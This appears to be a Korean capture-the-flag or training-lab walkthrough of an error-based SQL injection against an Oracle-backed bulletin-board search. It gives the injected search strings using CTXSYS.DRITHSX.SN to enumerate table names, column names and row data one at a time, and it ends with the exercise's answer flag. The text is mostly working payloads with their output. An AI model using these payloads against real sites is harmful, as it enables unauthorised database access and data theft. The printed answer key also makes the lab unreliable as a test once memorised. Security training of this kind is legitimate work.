1> 예상 쿼리문
select 글번호,제목,... from 자유게시판 where 제목 like '%__검색어__%' or 내용 like '%__검색어__%' or 작성자 like '%__검색어__%';
2> 공격 포인트
 ' -> 에러 확인

3. Error-based 제약 사항  >> 개수 찾기 -> 1rows씩 확인
select 글번호,제목,... from 자유게시판 
where 제목 like '%fds%' and CTXSYS.DRITHSX.SN(user,(select 'hacker' from dual))='pp%';

검색어: fds%' and CTXSYS.DRITHSX.SN(user,(_공격쿼리_))='pp // 같지 않으면 에러 출력
4. 테이블 명
    select table_name from user_tables
    4-1 개수: 6개
        select count(table_name) from user_tables
        > fds%' and CTXSYS.DRITHSX.SN(user,(select count(table_name) from user_tables))='pp
    4-2. 1 rows씩: BOARD, COMM_FILE, COMM_MDI_FILE, MEMBER, EQST_ANSWER, ZIPCODE
        select table_name 
        from (select rownum as ln, table_name from user_tables) 
        where ln=1~6
        fds%' and CTXSYS.DRITHSX.SN(user,(select count(table_name) from user_tables))='pp
        > fds%' and CTXSYS.DRITHSX.SN(user,(select table_name from (select rownum as ln, table_name from user_tables) where ln=2))='pp : BOARD

5. 컬럼명
    select column_name from cols where table_name='EQST_ANSWER'
    5-1. 개수: 5
        select count(column_name) from cols where table_name='EQST_ANSWER'
        > fds%' and CTXSYS.DRITHSX.SN(user,(select count(column_name) from cols where table_name='EQST_ANSWER'))='pp
    5-2. 1 rows씩: ANSWER_COLUMN, REG_DT, REG_ACCT_ID, UDT_DT, UDT_ACCT_ID
        select column_name from (select rownum as ln, column_name from cols where table_name='EQST_ANSWER')
        where ln=1
        > fds%' and CTXSYS.DRITHSX.SN(user,(select column_name from 
        (select rownum as ln, column_name from cols where table_name='EQST_ANSWER') where ln=5))='pp

6. 데이터 탈취 (오라클 문자 붙이기는 "||" 사용하기) ex> select name||' '||hobby from members;
    select ANSWER_COLUMN from EQST_ANSWER
    > fds%' and CTXSYS.DRITHSX.SN(user,(select ANSWER_COLUMN from EQST_ANSWER))='pp

[정답] skinfosec_eqst_lms_system